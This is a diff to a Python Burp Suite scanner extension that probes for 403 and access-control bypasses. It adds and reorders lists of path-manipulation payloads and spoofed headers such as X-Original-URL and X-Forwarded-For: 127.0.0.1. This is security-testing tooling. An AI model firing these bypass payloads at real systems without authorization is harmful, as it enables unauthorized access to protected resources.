@@ -2,6 +2,7 @@ from burp import IBurpExtender
 from burp import IScannerCheck
 from burp import IScanIssue
 from java.io import PrintWriter
+import re
 from array import array
 
 class BurpExtender(IBurpExtender, IScannerCheck):
@@ -33,7 +34,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
 
     def _get_matches(self, sttcode):
         #response = self._helpers.bytesToString(response)
-        if sttcode >= 400 and sttcode <= 500:
+        if 400 <= sttcode <= 500:
             return True
         return False
 
@@ -43,6 +44,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         print("headerStr: " + headerStr)
         return headerStr
 
+    # 被动扫描执行
     def doPassiveScan(self, baseRequestResponse):
         
         # look for matches of our passive check grep string
@@ -75,14 +77,14 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         payloads = ["/"+HURl,"%2e"+LastPath,"%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", "%20/"+LastPath,LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/" , LastPath+"?",LastPath+"??"
         ,"/"+LastPath+"//",LastPath+"/",LastPath+"/.randomstring",LastPath+".json"]
         # hpayloads = ["X-Rewrite-URL: "+OriginalUrl, "X-Original-URL: "+OriginalUrl,"Referer: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwared-Host: 127.0.0.1"]
-        hpayloads = ["Content-Length: 0","X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath, "Referer: "+ Rurl,"X-Host: 127.0.0.1","X-Client-IP: 127.0.0.1"
+        hpayloads = ["X-Original-URL: "+LastPath,"Content-Length: 0","X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath, "Referer: "+ Rurl,"X-Host: 127.0.0.1","X-Client-IP: 127.0.0.1"
         ,"X-Forwarded-For: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwared-Host: 127.0.0.1","X-Remote-IP: 127.0.0.1","Referer: /"+LastPath,"Referer: "+HURl,"X-Http-Destinationurl: 127.0.0.1","X-Frame-Options: Allow"
         ,"Client-IP: 127.0.0.1","Proxy-Host: 127.0.0.1","Request-Uri: 127.0.0.1","X-Forwarded-By: 127.0.0.1","X-Forwarded: 127.0.0.1","X-Forwarded-For-Original: 127.0.0.1","X-Forwarded-Server: 127.0.0.1",
         "X-Forwarder-For: 127.0.0.1","X-Forward-For: 127.0.0.1","Base-Url: 127.0.0.1","Http-Url: 127.0.0.1","Proxy-Url: 127.0.0.1","Redirect: 127.0.0.1",
         "Real-Ip: 127.0.0.1","Referer: 127.0.0.1","Referrer: 127.0.0.1","Refferer: 127.0.0.1","Uri: 127.0.0.1","Url: 127.0.0.1","X-Http-Host-Override: 127.0.0.1","Url: "+Upath,"Url: "+HURl,"Uri: "+Upath,"Uri: "+HURl,
         "X-Original-Remote-Addr: 127.0.0.1","X-Original-Url: 127.0.0.1","X-Proxy-Url: 127.0.0.1","X-Rewrite-Url: 127.0.0.1","X-Real-Ip: 127.0.0.1",
         "X-Remote-Addr: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Proxy-Url: "+Upath,"Http-Url: "+Upath,"Proxy-Url: "+Upath,"Base-Url: "+Upath,"Proxy-Url: "+Upath]
-        hspayloads = [HURl,"X-Rewrite-URL: "+Upath,"X-Original-URL: "+Upath, "X-Rewrite-URL: "+Upath,"X-Forwarded-Path: "+Upath,"Referer: "+HURl,"X-Proxy-Url: "+Upath,"Http-Url: "+Upath,"Proxy-Url: "+Upath,"Base-Url: "+Upath,"Proxy-Url: "+Upath,"Url: "+Upath,"Url: "+HURl,"Uri: "+Upath,"Uri: "+HURl]
+        hspayloads = ["X-Rewrite-URL: "+Upath,"X-Original-URL: "+Upath, "X-Rewrite-URL: "+Upath,"X-Forwarded-Path: "+Upath,"Referer: "+HURl,"X-Proxy-Url: "+Upath,"Http-Url: "+Upath,"Proxy-Url: "+Upath,"Base-Url: "+Upath,"Proxy-Url: "+Upath,"Url: "+Upath,"Url: "+HURl,"Uri: "+Upath,"Uri: "+HURl]
 
         results = []
 
